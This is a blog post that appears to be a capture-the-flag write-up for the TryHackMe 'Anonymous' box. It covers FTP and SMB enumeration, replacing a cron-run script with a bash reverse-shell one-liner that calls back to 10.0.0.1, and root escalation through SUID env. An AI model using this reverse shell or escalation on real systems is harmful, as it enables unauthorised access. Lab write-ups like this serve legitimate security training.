---
layout: post
title:  "THM - Anonymous"
date:   2020-07-14 18:00:00 +1000
category: hacking
---

## Introduction
*Try to get the two flags!  Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners. Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods.*  

This is a medium rated box, although the description suggests it is for beginners. 

## Ports
nmap says we've got 21 (FTP), 22 (SSH), plus 139 and 445 (SMB).

## FTP
FTP allows anonymous login and there are three files: a todo list, a shell script for cleaning up tmp files and a log of cleaned files. None of these are super interesting at first blush, but the script may come into play later on....

## SMB
We can enumerate the shares with smbclient and then login to the *pics* share, from where we can retrieve two pictures of dogs and nothing else. This suggests a stego challenge. Have I mentioned that I hate stego? Nevertheless I did spend some time throwing some stego tools at the images but drew a blank. Back to FTP?

## FTP Redux
We actually have write access to the FTP share and if we pay attention we can deduce that the script for cleaning up the tmp files is running on a frequent schedule, presumably via a cron job. So we can *replace* the script contents to get ourselves a reverse shell; the [pentest monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) bash shell does the job:

``
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
``

## On the box
Now we're on the box we can get the user flag and run linpeas.sh from /dev/shm. This provides a few suggestions, one of which is the SUID bit on /usr/bin/env. 

[GTFOBins](https://gtfobins.github.io/gtfobins/env/) gives a command:

``
./env /bin/sh -p
``

We edit the path a little and boom! We are root:
>/usr/bin/env /bin/sh -p  
#whoami  
root  

So yeah I guess it was pretty easy :)
